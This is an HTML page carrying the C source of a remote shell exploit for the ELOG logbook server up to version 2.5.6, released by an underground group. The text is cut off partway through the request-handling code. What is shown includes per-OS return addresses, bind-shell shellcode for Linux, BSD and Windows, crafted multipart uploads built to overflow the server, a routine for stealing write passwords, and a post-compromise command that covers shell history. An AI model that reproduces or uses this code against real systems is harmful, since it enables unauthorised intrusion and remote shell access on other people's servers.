<html>
<head>
<title>ELOG <= 2.5.6 Remote Shell Exploit </title>
<pre>
/* Worked on latest version for me 
 * http://midas.psi.ch/elog/download/tar/elog-latest.tar.gz
 * elog-latest.tar.gz      26-Jan-2005 21:36  519K
 * Default port 8080.
 * str0ke */

/*                                                                      
    
Hi there, someone has brought to u a gift.
 
     ELOG Remote Shell Exploit &lt;= 2.5.6 (Also for future Versions)
 
      Updated On 18/April/2004

      LOCK YOUR LOGBOOKZ, THERE IS A SPY IN THE WILD! 

 Bug: Sorry, we do not support fool-disclosure.

 Characteristicz : Fully Automated Filling Mechanism ,steal/decode base_64 ELOG _write_ passwordz.
                   (breakin into write password protected servers,)
 
 Targeting : objdump -t elogd | grep _mtext   &lt;----- your magic jumping addres.
             change that value with one of the targets below .If The ret lookz like 0x09..  
             then that means elogd version is 2.5.5 or greater.If 0x8.. then &lt; 2.5.5
             NOte: The buffer-length in linux, varies from one distro to other, like the BSD one.
              so do not add shit to the target area unless as well as u know what u r doing.

 Tricks   i : Some hosts using Elog daemon under Apache mod_proxy module,
              so u'd better  force a bit yourself port scan that host in order to get the elog port.
              (Be warned , most of the serverz we owned had at least 2 running elog http servers.)              

         ii : If U can _not_ get the write pazzword for logbook, then try other logbooks.
		        (especially, happens when the background mode enabled).


        iii : If u happen to meet logbook which has more than 10 attribute/optionz
              then add more globalz to the global sectionz of this code,now it supportz 
              10 att/opt, i haven't seen more than this Yet!.

Challange: Find the other 2 heap and a 1 url traversal bugs in elogd.(Both exploitable)
 
Finally A big FUCK to the Sn2 for leaking this code to the public.

 Unknown u.g Bl4ckh4t group member[3]



                        nrktx                                    DIGITALLY SIGNATURED

_EOC_

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;strings.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;ctype.h&gt;
#include &lt;time.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/select.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;errno.h&gt;
#include &lt;err.h&gt;

#define _GNU_SOURCE
#define CONTSIZE            10000
#define BOUNSIZE            100
#define REQUESTSIZE         2000
#define INBUF               5000
#define LINEBUFSIZ          1000
#define GETBUFSIZE          10000
#define SENDBUFSIZE         10000
#define TIMEOUT             30
#define ENURLSIZE           200
#define GLOBATTSIZE         200
#define STORESIZE           10000
#define ELOGPORT            8080
#define SHBUFSIZE           288
#define BIGBUFSIZE          5000
#define BACKDOOR            31337
#define BSDBACKDOOR         11520
#define WINBACKDOOR         5555
#define NOP                 0x90
#define RED                 &quot;\033[31m&quot;
#define GREEN               &quot;\033[32m&quot;
#define DEFAULT             &quot;\033[0m&quot;
#define CHECKELOG           &quot;HEAD HTTP/1.1&quot;
#define HTTPVER             &quot; HTTP/1.1\r\n&quot;
#define POSTREQ             &quot;POST /&quot;
#define GETREQ              &quot;GET /&quot;
#define GETREQCMD           &quot;?cmd=download&quot;           
#define TESTUSER            &quot;candy-n4rk0tix&quot;
#define TESTPASS_DECODED    &quot;candy-blackhat&quot;
#define ADDICTEDZ           &quot;candy:narkotix&quot;
#define EXPERIMENT          &quot;iloveucandy&quot;
#define LOGBOOKAUTHOR       &quot;CodeName : Candy-bl4ckh47&quot;
#define LOGSUBJECT          &quot;Mission Impossible&quot;
#define ATT_FILE            &quot;do-NOT-trust-me-biatch&quot;
#define MSGCONTENT          &quot;Building Required HTML CONTENT&quot;
#define MSGQUERY            &quot;Building Required HTML QUERY&quot;
#define MSGVER              &quot;Asking For Version...&quot;
#define MSGBOUNDARY         &quot;Building Random BOUNDARY..&quot;
#define MSGSECTOR           &quot;Checking IF Sector Is CLEAR..&quot;
#define READOPTION          &quot;Getting Required Attr Options BE PATIENT !&quot;
#define PASSALERT           &quot;LogBook Is Write Password Protected&quot;
#define GETINGPASS          &quot;Wait Bro We R Gonna Catch The Password&quot;
#define PASSSUCCESS         &quot;WE GOT The Write Password Bro !!&quot;
#define CLEARAREA           &quot;[SECTOR CLEAR.. FORCING OUR LUCK TO GET IN]&quot;
#define NODATA              &quot;EOF&quot;
#define PASSFAILED          &quot;Could not get password, Prolly Elogd started with -D arg !&quot;
#define DEMOLOGBOOK         &quot;demo&quot;
#define UPLOADME            1
#define NOTUPLOADME         0
#define VERSION_CHECKER     &quot;Server: ELOG HTTP &quot;
#define AUTHORIZED_DENY     &quot;401 Authorization Required&quot;
#define SECTOR_CLEAR        &quot;302 Found&quot;
#define INVALIDURL          &quot;Invalid URL&quot;
#define ATTERR              &quot;Error: Attribute &quot;
#define ATTOPTERR           &quot;Error: Attribute option &quot;
#define ATTERRTAG           &quot;&lt;b&gt;&quot;
#define ATTERRTAGLAST       &quot;&lt;/b&gt;&quot;
#define ATTNOTFOUND(x)      {fprintf(stderr,&quot;[!] Attribute %s Notfound\n&quot;,x);}
#define MAKINGATT(x)        {fprintf(stderr,&quot;&quot;GREEN&quot;[+]&quot;DEFAULT&quot; Attribute %s ADDING..\
                             \t&quot;GREEN&quot;DONE&quot;DEFAULT&quot;\n&quot;,x);}
#define NOTELOG             &quot;Remote Server Is NOT Elog !&quot;
#define REMDOWN             &quot;Connection reset by Peer&quot;
#define REMCRASHED          &quot;Server DEAD&quot;
#define BIGOPTIONLIST       &quot;Too Many Attributes Dude,MODIFY THE CODE !&quot;
#define ASKEDPASS           &quot;Please enter password to obtain write access&quot;
#define ALLOCGLOB(x)        {x = (char *)malloc(GLOBATTSIZE *sizeof(char));}
#define ZEROGLOB(x)         { memset(x,'\0',GLOBATTSIZE);}
#define PRINTINFO(x,y)      {if(y &lt;= 1) printf(&quot;&quot;GREEN&quot;[+]&quot;DEFAULT&quot; %s\n&quot;,x);}                         
#define NPRINTINFO(x)       {printf(&quot;[-] %s\n&quot;,x);}
#define LOGBOOKNOTFOUND(x,y)  {bzero(x,sizeof(x));\
                               sprintf(x,&quot;Error: logbook \&quot;%s\&quot; not defined&quot;,y);\
                              }
#define BADSELECT           &quot;option value=\&quot;\&quot;&gt;&quot;
#define COMMAND             &quot;echo         '---[WE NEVER BELIEVE IN LUCK]---'; uptime ; uname -a ; id;&quot;\
                            &quot;TERM=xterm; export TERM; who ; unset HISTFILE\n&quot;
#define WINCMD              &quot;echo '----WE PWNED U DUDE---' &amp; hostname\n &quot;
char                        *map = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;
char                        content[CONTSIZE];  
static  int                 content_length;
static  unsigned char       boundary[BOUNSIZE];
char                        encoded_url[ENURLSIZE];
static int                  globcount = 0;
static int                  debug     = 1;
static int                  recount   = 0;
int                         id        = 0;
char                        wpassbufdec[50] = {'\0'};
char                        wpassbufenc[50] = {'\0'};
char                        userandpass[50] = ADDICTEDZ;
char                        encuserandpass[50] = ADDICTEDZ;
char                        bigbuffer[BIGBUFSIZE];
char                        shbuffer     [288];
char                        fedorabuf    [288];
char                        debianbuffer [264];
char                        windozebuf   [246];
char                        windozetext  [600];

static unsigned char glob1_att[GLOBATTSIZE] = {'\0'};
static unsigned char glob2_att[GLOBATTSIZE] = {'\0'};
static unsigned char glob3_att[GLOBATTSIZE] = {'\0'};
static unsigned char glob4_att[GLOBATTSIZE] = {'\0'};
static unsigned char glob5_att[GLOBATTSIZE] = {'\0'};
static unsigned char glob6_att[GLOBATTSIZE] = {'\0'};
static unsigned char glob7_att[GLOBATTSIZE] = {'\0'};
static unsigned char glob8_att[GLOBATTSIZE] = {'\0'};
static unsigned char glob9_att[GLOBATTSIZE] = {'\0'};
static unsigned char glob10_att[GLOBATTSIZE] = {'\0'};

static unsigned char glob1_opt[GLOBATTSIZE] = &quot;Other&quot;;
static unsigned char glob2_opt[GLOBATTSIZE] = &quot;Other&quot;;
static unsigned char glob3_opt[GLOBATTSIZE] = &quot;Other&quot;;
static unsigned char glob4_opt[GLOBATTSIZE] = &quot;Other&quot;;
static unsigned char glob5_opt[GLOBATTSIZE] = &quot;Other&quot;;
static unsigned char glob6_opt[GLOBATTSIZE] = &quot;Other&quot;;
static unsigned char glob7_opt[GLOBATTSIZE] = &quot;Other&quot;;
static unsigned char glob8_opt[GLOBATTSIZE] = &quot;Other&quot;;
static unsigned char glob9_opt[GLOBATTSIZE] = &quot;Other&quot;;
static unsigned char glob10_opt[GLOBATTSIZE] = &quot;Other&quot;;

 struct globalz
   {
    char *addr;
    int  id;
    };
 
 struct target
   {
    char *distro;
    long ret;
    int   id;
    };

 struct target TARGETZ[] =
{
    {&quot;Slackware 9.1&quot;       , 0x08629588 , 0},
    {&quot;Gentoo 3.3.5-r1 &quot;    , 0x09093f40 , 1},  /* 0x08624572 for Gentoo 3.3.2 */
    {&quot;FreeBSD 4.9 STABLE &quot; , 0x0906aa24 , 2},
    {&quot;Mandrake 10.1&quot;       , 0x085dd70a , 3},
    {&quot;Fedora Core 1&quot;       , 0x08624600 , 4},  /* Fedora sux, Inferno  Rulez*/
    {&quot;Debian 3.0   &quot;       , 0x085e0420 , 5},  /* 2.5.6-1 - 0x090853e0 /str0ke */ 
    {&quot;WinXP SP2 Elog-2.5.6&quot;, 0x0055D9F0 , 6},  /* Fuck that NULL byte, it is innocent */
    {&quot;Redhat 7.3   &quot;       , 0x85dd3c0  , 7},
    {&quot;Redhat E.L   &quot;       , 0x090653a0 , 8},
    {&quot;Slackware 10 &quot;       , 0x09064c80 , 9},    
    {&quot;FreeBSD 5.2  &quot;       , 0x090673c0 , 10},
    {&quot;FreeBSD 5.3 STABLE&quot;  , 0x090658e0 , 11},
    {&quot;NULL         &quot;       , 0x0        , -1},
};   

struct globalz MISSED[]=
{
    {(char *)&amp;glob1_att,          0},
    {(char *)&amp;glob2_att,          0},
    {(char *)&amp;glob3_att,          0},
    {(char *)&amp;glob4_att,          0},
    {(char *)&amp;glob5_att,          0},
    {(char *)&amp;glob6_att,          0},
    {(char *)&amp;glob7_att,          0},
    {(char *)&amp;glob8_att,          0},
    {(char *)&amp;glob9_att,          0},
    {(char *)&amp;glob10_att,         0},
    { NULL              ,         0},
};

struct globalz TRASH[]=
{
    {(char *)&amp;glob1_opt,          0},
    {(char *)&amp;glob2_opt,          0},
    {(char *)&amp;glob3_opt,          0},
    {(char *)&amp;glob4_opt,          0},
    {(char *)&amp;glob5_opt,          0},
    {(char *)&amp;glob6_opt,          0},
    {(char *)&amp;glob7_opt,          0},
    {(char *)&amp;glob8_opt,          0},
    {(char *)&amp;glob9_opt,          0},
    {(char *)&amp;glob10_opt,         0},
    {NULL               ,         0}
};


/*linux portbind 31337*/
char lnx_shellcode[] =
                        &quot;\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1&quot;
                        &quot;\xb0\x66\xcd\x80\x31\xd2\x52\x66\x68\x7a\x69&quot;
                        &quot;\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89\xe1&quot;
                        &quot;\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43&quot;
                        &quot;\xb0\x66\xcd\x80\x83\xc4\x0c\x52\x52\x43\xb0&quot;
                        &quot;\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x41&quot;
                        &quot;\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68&quot;
                        &quot;\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1&quot;
                        &quot;\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90&quot;
                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
                        &quot;\x90\x90\x90\x90&quot;;
                        
/*BSD portbind */
char bsd_shellcode[] =
   
                        &quot;\x31\xc0\x99\x52\x42\x52\x42\x52\x50\xb0\x61&quot;
                        &quot;\xcd\x80\x6a\x2d\x66\x52\x89\xe3\x6a\x10\x53&quot;
                        &quot;\x50\x50\xb0\x68\xcd\x80\x5b\x50\x53\x50\xb0&quot;
                        &quot;\x6a\xcd\x80\xb0\x1e\xcd\x80\x52\x50\x52\xb0&quot;
                        &quot;\x5a\xcd\x80\x4a\x79\xf6\x68\x6e\x2f\x73\x68&quot;
                        &quot;\x68\x2f\x2f\x62\x69\x89\xe3\x50\x54\x53\x53&quot;
                        &quot;\xb0\x3b\xcd\x80\x90\x90\x90\x90\x90\x90\x90&quot;;
/*Win2k portbind 5555*/
char win_shellcode[] =
                       &quot;\x66\x81\xec\x04\x07&quot;
                       &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31&quot;
                       &quot;\xc9\x81\xe9\xa6\xff\xff\xff\x81\x36\x76\xac\x7c\x25\x81\xee\xfc&quot;
                       &quot;\xff\xff\xff\xe2\xf2\xeb\x05\xe8\xe2\xff\xff\xff\x9e\x94\x7c\x25&quot;
                       &quot;\x76\xef\x31\x61\x76\x4b\x05\xe3\x0f\x49\x35\xa3\x3f\x08\xd1\x0b&quot;
                       &quot;\x9f\x08\x66\x55\xb1\x75\x75\xd0\xdb\x67\x91\xd9\x4d\x22\x32\x2b&quot;
                       &quot;\x9a\xd2\xa4\xc7\x05\x01\xa5\x20\xb8\xde\x82\x96\x60\xfb\x2f\x17&quot;
                       &quot;\x29\x9f\x4e\x0b\x32\xe0\x30\x25\x77\xf7\x28\xac\x93\x25\x21\x25&quot;
                       &quot;\x1c\x9c\x25\x41\xfd\xad\xf7\x65\x7a\x27\x0c\x39\xdb\x27\x24\x2d&quot;
                       &quot;\x9d\xa0\xf1\x72\x5a\xfd\x2e\xda\xa6\x25\xbf\x7c\x9d\xbc\x16\x2d&quot;
                       &quot;\x28\xad\x92\x4f\x7c\xf5\xf7\x58\x76\x2c\x85\x23\x02\x48\x2d\x76&quot;
                       &quot;\x89\x98\xf3\xcd\xe6\xac\x7c\x25\x2f\x25\x78\xab\x94\x47\x4d\xda&quot;
                       &quot;\x10\x2d\x90\xb5\x77\xf8\x14\x24\x77\xac\x7c\xda\x23\x8c\x2b\x72&quot;
                       &quot;\x21\xfb\x3b\x72\x31\xfb\x83\x70\x6a\x25\xbf\x14\x89\xfb\x2b\x4d&quot;
                       &quot;\x74\xac\x69\x96\xff\x4a\x16\x35\x20\xff\x83\x70\x6e\xfb\x2f\xda&quot;
                       &quot;\x23\xb8\x2b\x73\x25\x53\x29\x35\xff\x6e\x1a\xa4\x9a\xf8\x7c\xa8&quot;
                       &quot;\x4a\x88\x4d\xe5\x1c\xb9\x25\xd6\xdd\x25\xab\xe3\x32\x88\x6c\x61&quot;
                       &quot;\x88\xe8\x58\x18\xff\xd0\x58\x6d\xff\xd0\x58\x69\xff\xd0\x58\x75&quot;
                       &quot;\xfb\xe8\x58\x35\x22\xfc\x2d\x74\x27\xed\x2d\x6c\x27\xfd\x83\x50&quot;
                       &quot;\x76\xfd\x83\x70\x46\x25\x9d\x4d\x89\x53\x83\xda\x89\x9d\x83\x70&quot;
                       &quot;\x5a\xfb\x83\x70\x7a\x53\x29\x0d\x25\xf9\x2a\x72\xfd\xc0\x58\x3d&quot;
                       &quot;\xfd\xe9\x40\xae\x22\xa9\x04\x24\x9c\x27\x36\x3d\xfd\xf6\x5c\x24&quot;
                       &quot;\x9d\x4f\x4e\x6c\xfd\x98\xf7\x24\x98\x9d\x83\xd9\x47\x6c\xd0\x1d&quot;
                       &quot;\x96\xd8\x7b\xe4\xb9\xa1\x7d\xe2\x9d\x5e\x47\x59\x52\xb8\x09\xc4&quot;
                       &quot;\xfd\xf6\x58\x24\x9d\xca\xf7\x29\x3d\x27\x26\x39\x77\x47\xf7\x21&quot;
                       &quot;\xfd\xad\x94\xce\x74\x9d\xbc\xac\x9c\xf3\x22\x78\x2d\x6e\x74\x25&quot;;


char                       *make_http_content(int  ,  char*);
char                       *make_random_boundary    (void);
char                       *make_request_header(char *,char *,int);
char                       *urlencode  (char *);
void                       base64_encode     (char *, char *);
void                       get_server_version(char *, unsigned short int);
void                       base64_decode     (char *, char *);
void                       get_missing_attributes  (char *, char *,char *);
void                       alloc_all_globalz   (void);
void                       re_check_sector (char *,unsigned short,char *,int);
void                       spy_attr_options (char *,unsigned short int, char *);
void                       make_spy_header(char *,short, char *,char *);
void                       crack_the_code (char *,unsigned short, char *);
void                       authorize_user(char * , char *);
void                       build_att_buffer (int , int);
void                       do_last_stage   ( char *  ,short  ,   char *);
void                       we_r_coming     (char* );
void                       shell(int sock);
void                       banner(void);
void                       usage(char *);
void                       listos(void);
long                       get_host_ip (char *);
int                        cind    (char c);
int                        is_there_attribute  (void);
int                        check_for_clear_sector (char *,unsigned short int,char *,int);


int main             (int argc , char *argv[])
{
   int       flg;
   int       port      = ELOGPORT;
   int       uniz      = 0;
   char      *logbook  = DEMOLOGBOOK;
   char      *hostname = NULL;
   char      *u_name   = TESTUSER;
   char      *u_pwd    = TESTPASS_DECODED;
   char      *write_pazzword = NULL;

   banner();
    while((flg = getopt(argc,argv,&quot;h:p:l:o:w:u:r:dD&quot;)) !=EOF)
      {
        switch(flg)
         {
          case 'h':
               hostname = strdup(optarg);
               break;
          
          case 'p':
               port = atoi(optarg);
               break;

          case 'l':
               logbook = strdup(optarg);
               break;

          case 'o':
               id      = atoi(optarg);
                if((id == 2) || (id == 10) || (id == 11)){
                uniz++;
                break;}
                if(id == 6)
                uniz = 2;
               break;

          case 'd':
               listos();
               exit(1);
          
          case 'u':
               u_name  = strdup(optarg);
               break;

          case 'r':
               u_pwd   = strdup(optarg);
               break;

          case 'w':
               write_pazzword = strdup(optarg);
               strncpy(wpassbufdec,write_pazzword,49);
               break;

          default :
               usage(argv[0]);
               
         }
      }           

          if(!hostname)
             exit(1);
           printf(&quot;&quot;GREEN&quot;[+]&quot;DEFAULT&quot; Exploiting on %s : 0x%lx\n&quot;,TARGETZ[id].distro,TARGETZ[id].ret);
           alloc_all_globalz();
           build_att_buffer(uniz,id);
           authorize_user(u_name , u_pwd);
           get_server_version(hostname,port);
           check_for_clear_sector(hostname,port,logbook,0);
return(0);
}




void         base64_encode(char *s, char *d)
{
   unsigned int t, pad;

   pad = 3 - strlen(s) % 3;
   if (pad == 3)
      pad = 0;
   while (*s) {
      t = (*s++) &lt;&lt; 16;
      if (*s)  
         t |= (*s++) &lt;&lt; 8;
      if (*s)  
         t |= (*s++) &lt;&lt; 0;
      
      *(d + 3) = map[t &amp; 63];
      t &gt;&gt;= 6;  
      *(d + 2) = map[t &amp; 63];
      t &gt;&gt;= 6;
      *(d + 1) = map[t &amp; 63];
      t &gt;&gt;= 6;
      *(d + 0) = map[t &amp; 63];
  
      d += 4;
   }
   *d = 0;
   while (pad--)

      *(--d) = '=';
}


void        base64_decode(char *s, char *d)
{
   unsigned int t;
                     
   while (*s) {
      t = cind(*s) &lt;&lt; 18;
      s++;
      t |= cind(*s) &lt;&lt; 12;
      s++;
      t |= cind(*s) &lt;&lt; 6;
      s++;
      t |= cind(*s) &lt;&lt; 0;
      s++;
      
      *(d + 2) = (char) (t &amp; 0xFF);
      t &gt;&gt;= 8;
      *(d + 1) = (char) (t &amp; 0xFF);
      t &gt;&gt;= 8;
      *d = (char) (t &amp; 0xFF);
      
      d += 3;
   }
   *d = 0;
}

int                   cind(char c)
{  
   int i;
   
   if (c == '=')
      return 0;
   
   for (i = 0; i &lt; 64; i++)
      if (map[i] == c)
         return i;
   
   return -1;
}

void             get_server_version(char *hostname,unsigned short port)
 {
   const unsigned char *version_chec = VERSION_CHECKER;
   const unsigned char *version_request = CHECKELOG;
   int          yes = 1;
   int          get_total = 0;
   int          send_total = 0;
   char         info_buf[INBUF];
   int          sock_req;
   int          ready;   
   struct sockaddr_in rem_addr;
   fd_set             read_fd;
   struct timeval     w_t;
     
     w_t.tv_sec  = TIMEOUT;
     w_t.tv_usec = 0;
     
   PRINTINFO(MSGVER,1);
 
           sock_req = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
             if(sock_req &lt; 0) {
             perror(&quot;socket&quot;);
             exit(EXIT_FAILURE);
             }
          if(setsockopt(sock_req,SOL_SOCKET,SO_REUSEADDR,&amp;yes,sizeof(int)) == -1)
          { perror(&quot;setsockopt&quot;);
          exit(1);
          }
   
           memset(&amp;(rem_addr.sin_zero),'\0',8);
           rem_addr.sin_family = AF_INET;
           rem_addr.sin_port   = htons(port);
           rem_addr.sin_addr.s_addr = get_host_ip(hostname);            
      
               if( connect(sock_req,(struct sockaddr *)&amp;rem_addr,sizeof(struct sockaddr)) == -1)
                { 
                err(1,NULL);
                exit(1);
                }
     
          FD_ZERO(&amp;read_fd);
          FD_SET(sock_req,&amp;read_fd);
          
               if ((send_total = send(sock_req,version_request,strlen(version_request),0)) == -1)
                {
                perror(&quot;send&quot;);
                exit(1);
                }
         if((ready = select(sock_req+1,&amp;read_fd,(fd_set *)NULL,(fd_set *)NULL,&amp;w_t)) &lt; 0){
             perror(&quot;select&quot;);
             exit(1);
             }
         if(FD_ISSET(sock_req,&amp;read_fd))
          {
               if( (get_total = recv(sock_req,info_buf,sizeof(info_buf)-1,0)) == -1)
                {
                perror(&quot;recv&quot;);
                exit(1);
                }
                  else if(get_total &lt;= 0){
                  fprintf(stderr,&quot;[-]Can not receive information\n&quot;);
                  exit(1);
                  }
          info_buf[get_total] = '\0';
          int i;
          char             linebuf[LINEBUFSIZ];
          char             lastbuf[LINEBUFSIZ];
          bzero(linebuf,sizeof(linebuf));
          bzero(lastbuf,sizeof(lastbuf));

          char *p = (char *)&amp;linebuf[0];
          char *k = (char *)&amp;lastbuf[0];
   
          char *z;
             if((z = strstr(info_buf,version_chec)) != NULL) 
              {
                strncpy(p,z,500);
                  for(i = 0; (*p != '-') &amp;&amp; (*p != '\n'); i++){  
                   *k++ = *p++;
                   }
              PRINTINFO(lastbuf,debug);
              close(sock_req); 
              return; 
              }
          }
           NPRINTINFO(NOTELOG);
           close(sock_req);
           exit(1);
 }



char                    *make_random_boundary(void)
 {
        PRINTINFO(MSGBOUNDARY,debug); 
        char          bound_buf[BOUNSIZE];
        char          *p;
        p = bound_buf;
        srand((unsigned) time(NULL));
    
         bzero(bound_buf,sizeof(bound_buf));
         sprintf(bound_buf,&quot;---------------------------%04X%04X%04X&quot;,rand(),rand(),rand());
         return(p);
 }




char                    *make_http_content(int choice,char *logbookname) 
 {
  char                 *pazzword   = TESTPASS_DECODED;
  char                 passencode[50];
  char                 *text       = NULL;
  const char           *experiment = logbookname;
  const char           *att_file   = shbuffer;
  const char           *testuser   = TESTUSER;
  const char           *subject    = LOGSUBJECT;
  char                 *l_content  = content;
  int                  include_evilfile = 0;
  int                  attrcount = 0;
  int                  j;    
                if(choice == UPLOADME)
                include_evilfile = 1;
                else if (choice == NOTUPLOADME)
                include_evilfile = 0;
 
     if(id == 4)
     att_file = fedorabuf;
     if((id == 5) || (id == 2))
     att_file = debianbuffer;
     if(id == 6){
     att_file = windozebuf;
     text     = windozetext;
     }
     if(id != 6)
     text = bigbuffer;
     sprintf(boundary,&quot;%s&quot;,make_random_boundary());

     PRINTINFO(MSGCONTENT,debug);

     base64_encode(pazzword,passencode);


  strcpy(content,boundary);

  strcat(content, &quot;\r\nContent-Disposition: form-data; name=\&quot;cmd\&quot;\r\n\r\nSubmit\r\n&quot;);
  
  sprintf(content + strlen(content),
          &quot;%s\r\nContent-Disposition: form-data; name=\&quot;wpwd\&quot;\r\n\r\n%s\r\n&quot;,boundary,wpassbufenc); 

  sprintf(content + strlen(content),
          &quot;%s\r\nContent-Disposition: form-data; name=\&quot;unm\&quot;\r\n\r\n%s\r\n&quot;,boundary,testuser);

  
  sprintf(content + strlen(content),
          &quot;%s\r\nContent-Disposition: form-data; name=\&quot;upwd\&quot;\r\n\r\n%s\r\n&quot;, boundary, passencode);
  
  sprintf(content + strlen(content),
          &quot;%s\r\nContent-Disposition: form-data; name=\&quot;exp\&quot;\r\n\r\n%s\r\n&quot;, boundary, experiment);


    if((attrcount = is_there_attribute())) {
      for( j = 0; j &lt; attrcount ; j++) {
  
  sprintf(content + strlen(content),
          &quot;%s\r\nContent-Disposition: form-data; name=\&quot;%s\&quot;\r\n\r\n%s\r\n&quot;, 
           boundary,MISSED[j].addr,TRASH[j].addr);
         }
      }

  sprintf(content + strlen(content),
          &quot;%s\r\nContent-Disposition: form-data; name=\&quot;Subject\&quot;\r\n\r\n%s\r\n&quot;, boundary, subject);

  
  sprintf(content + strlen(content),
          &quot;%s\r\nContent-Disposition: form-data; name=\&quot;Text\&quot;\r\n\r\n%s\r\n&quot;, boundary, text);

   if(include_evilfile){  

  sprintf(content + strlen(content),
          &quot;%s\r\nContent-Disposition: form-data; name=\&quot;attfile\&quot;;filename=\&quot;%s\&quot;\r\n&quot;, boundary, att_file);
  }
  
  sprintf(content + strlen(content),&quot;%s\r\n&quot;, boundary);
 

                   content_length = strlen(content);
                   content[content_length] = '\0';
                   return(l_content);
}



char                *urlencode(char *str)
{
   char             *p;
   char *s          = encoded_url;
   p                = str;
   char             *encoded = encoded_url;

            bzero(encoded_url,sizeof(encoded_url));
 
            if(index(str,' ') == NULL) {
             return(str);
            }
              while(*p &amp;&amp; (int) s &lt; (int) encoded_url + 50 ) {
                *s = *p;
                  if(*p == ' '){
                   *s = '+';
                  }   
                s++;
                p++;
}

return(encoded);
}



char                *make_request_header(char *logbookname,char *glob_boundary,int which)
 {
  glob_boundary       = boundary;
  char                request[REQUESTSIZE];
  char                *p = request;
  char                boun_buf[BOUNSIZE];
  char                host_name[50];
  char                *url_enc = urlencode(logbookname);
  
  
              if(gethostname(host_name,sizeof(host_name)) == -1)
                { perror(&quot;gethostname&quot;);
                  exit(EXIT_FAILURE);
                }
                sprintf(boun_buf,&quot;%s&quot;,boundary);

             if(which){  
              PRINTINFO(MSGQUERY,debug);
              }
  strncpy(request,POSTREQ,sizeof(POSTREQ));
  sprintf(request + strlen(request), &quot;%s/&quot;,url_enc);
  strcat(request,HTTPVER);
  sprintf(request + strlen(request), &quot;Content-Type: multipart/form-data; boundary=%s\r\n&quot;,glob_boundary);
  sprintf(request + strlen(request), &quot;Host: %s\r\n&quot;, host_name);
  sprintf(request + strlen(request), &quot;User-Agent: ELOG\r\n&quot;);
  sprintf(request + strlen(request), &quot;Authorization: Basic %s\r\n&quot;,encuserandpass);
  sprintf(request + strlen(request), &quot;Content-Length: %d\r\n\r\n&quot;, content_length);    
  bzero(encoded_url,sizeof(encoded_url));
  return(p);
}



long          get_host_ip(char *hname)
 {
  long ip_add;
  struct hostent *h;
   if((ip_add = inet_addr(hname)) &lt; 0)
    {
     h = gethostbyname(hname);
      if(h == NULL)
        {
         fprintf(stderr,&quot;[-]Can not resolve IP address\n&quot;);
         exit(1);
        }
      memcpy(&amp;ip_add,h-&gt;h_addr,h-&gt;h_length);
    } 
   return(ip_add);
 }





int                 check_for_clear_sector(char *hostname,unsigned short port,char *logbook,int flag)
 {
   struct        sockaddr_in rem_addr;
   char          sendbuf[SENDBUFSIZE];
   char          *sendbufp;
   char          getbuf[GETBUFSIZE];
   char          *reqbuf;
   char          notfound[100];
   int           yes;
   int           total;
   int sock;
   int          flagchoice;
   struct timeval w_t;
   fd_set          read_fd;
   int            total_fd;

           PRINTINFO(MSGSECTOR,debug);
           LOGBOOKNOTFOUND(notfound,logbook);             

HEAD:   
          bzero(&amp;w_t,sizeof(w_t));

          w_t.tv_sec     = TIMEOUT;
          w_t.tv_usec    = 0;

             if(flag == 0)
             flagchoice = NOTUPLOADME;
             else 
             flagchoice = UPLOADME;
   
         sock      = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
          if(sock &lt; 0)
           {
            perror(&quot;socket&quot;);
            exit(1);
           }
         if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(char *)&amp;yes,sizeof(int)))
           { perror(&quot;setsockopt&quot;);
           close(sock);
           exit(1);
           }
  

          memset(&amp;(rem_addr.sin_zero),'\0',8);
          rem_addr.sin_family = AF_INET;
          rem_addr.sin_port   = htons(port);
          rem_addr.sin_addr.s_addr = get_host_ip(hostname);

            if(connect(sock,(const struct sockaddr*)&amp;rem_addr,sizeof(rem_addr)))
             {  
             fprintf(stderr,&quot;[-] Can not Connect to server!\n&quot;);
             exit(1);
             }
        
          sendbufp = make_http_content(flagchoice,logbook);
          reqbuf = make_request_header(logbook,boundary,0);
          strcpy(sendbuf,reqbuf);
          strcat(sendbuf,sendbufp);

           if( (send(sock,sendbuf,sizeof(sendbuf),0)) &lt; 0 )
            {
            perror(&quot;send&quot;);
            exit(-1);
            close(sock);
            }

               FD_ZERO(&amp;read_fd);
               FD_SET(sock,&amp;read_fd);
      
               if( (total_fd = select(sock + 1,&amp;read_fd,(fd_set *)NULL,(fd_set *)NULL,&amp;w_t)) &lt; 0)
                {
                perror(&quot;select&quot;);
                close(sock);
                exit(-1);
                }

           
               if(FD_ISSET(sock,&amp;read_fd))
                {
                 if( (total = recv(sock,getbuf,sizeof(getbuf),0)) &lt; 1) {
                    if(errno == EWOULDBLOCK ){
                       NPRINTINFO(REMDOWN);
                       PRINTINFO(REMCRASHED,1);
                       close(sock); 
                       exit(-1);
                       }
                    close(sock);
                    exit(1);
                    }
                 if(strstr(getbuf,INVALIDURL)) {
                     fprintf(stderr,&quot;[-] Invalid URL Bitch, Type the Correct Path\n&quot;);
                     close(sock);
                     exit(-1);
                     }              

                 if(strstr(getbuf,AUTHORIZED_DENY)) {
                    fprintf(stderr,&quot;[-] Type User name and Password for login Bitch\n&quot;);
                    close(sock);
                    exit(-1);
                     }

                 if(strstr(getbuf,notfound)) {
                   fprintf(stderr,&quot;[-] NO %s LOGBOOK DEFINED BITCH\n&quot;,logbook);
                   close(sock);
                   exit(-1);
